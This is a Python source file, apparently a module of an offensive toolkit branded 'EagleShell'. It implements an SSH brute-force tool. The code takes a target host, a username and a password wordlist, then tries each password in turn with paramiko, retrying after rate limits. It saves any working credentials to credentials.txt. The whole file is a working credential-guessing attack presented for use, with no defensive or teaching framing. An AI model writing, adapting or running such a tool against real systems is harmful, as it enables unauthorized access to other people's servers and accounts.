#!/usr/bin/python3

from assets.banners import brutessh_banner
from assets.colors import *
from assets.designs import logo, author
from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, user_prefix
from assets.properties import clear_screen
from assets.shortcuts import Exit
from .brute_force import BruteForce
import os
import paramiko
import socket
import time


class BruteSSH:
    def __init__(self):
        self.host_set = ''
        self.user_set = ''
        self.wordlist_set = ''
        self.password_found = ''
        self.password_tried = 0
        self.configuration()
        self.set_ready()

    def header(self):
        os.system(clear_screen)
        print(logo)
        print(brutessh_banner)
        print(author)

    def configuration(self):
        try:
            self.header()
            print('Configuration:')
            print('\n\tHost Input')
            print('\tExample: 192.168.1.123')
            print('\n\tUser Input:')
            print('\tExample: admin')
            print('\n\tWordlist Input')
            print('\tExample: /usr/share/wordlists/mypasswords.txt')
            print('\n\tZ): Back')
            print('\tX): Exit\n')
            while True:
                self.host_set = input(rhost_prefix).lower()
                if self.host_set == 'z':
                    BruteForce()
                elif self.host_set == 'x':
                    Exit()
                self.user_set = input(user_prefix)
                if self.user_set == 'z' or self.user_set == 'Z':
                    BruteForce()
                elif self.user_set == 'x' or self.user_set == 'Z':
                    Exit()
                self.wordlist_set = input(wordlist_prefix)
                if self.wordlist_set == 'z' or self.wordlist_set == 'Z':
                    BruteForce()
                elif self.wordlist_set == 'x' or self.wordlist_set == 'X':
                    Exit()
                break
        except KeyboardInterrupt:
            Exit()

    def set_ready(self):
        passwords = open(self.wordlist_set).read().split("\n")
        for password in passwords:
            if self.brute_forcing(self.host_set, self.user_set, password):
                open("credentials.txt", "w").write(f"{self.user_set}@{self.host_set}:{password}")
                break

    def brute_forcing(self, hostname, username, password):
        self.header()
        print('Process:')
        print('\n\tStatus')
        print('\t------')
        print('\n\tStop: CTRL+C\n')
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            print(RED + "\t[!] Host: " + hostname + " is unreachable, timed out." + WHITE)
            return False
        except paramiko.AuthenticationException:
            print(RED + "\t[!] Invalid credentials for " + username + ":" + password + WHITE)
            self.password_tried = self.password_tried + 1
            return False
        except paramiko.SSHException:
            print(BLUE + "\t[*] Quota exceeded, retrying with delay..." + WHITE)
            time.sleep(60)
            return self.brute_forcing(hostname, username, password)
        except paramiko.ssh_exception.NoValidConnectionsError:
            print(RED + "\t[!] Host: " + hostname + " is unreachable, timed out." + WHITE)
            os.system('sleep 1')
            BruteSSH()
        except KeyboardInterrupt:
            self.result()
        else:
            self.password_found = password
            self.succ_fail = True
            self.result()

    def result(self):
        try:
            self.header()
            if self.succ_fail == True:
                color = GREEN
            else:
                color = RED
            print('Result:')
            print('\n\tHOST: ' + color + self.host_set + WHITE)
            print('\n\tUSERNAME: ' + color + self.user_set + WHITE)
            print('\n\tPASSWORD: ' + color + self.password_found + WHITE)
            print('\n\tWORDLIST: ' + color + self.wordlist_set + WHITE)
            print('\n\tPASSWORDS TRIED: ' + color + str(self.password_tried) + WHITE)
            print('\n\tY): New')
            print('\tZ): Menu')
            print('\tX): Exit\n')
            os.system('sleep 0.01')
            while True:
                cmd = input(eagleshell_prefix).lower()
                if cmd == 'y':
                    BruteSSH()
                elif cmd == 'z':
                    BruteForce()
                elif cmd == 'x':
                    Exit()
                else:
                    print(invalid_input_prefix)
                    continue
        except KeyboardInterrupt:
            Exit()
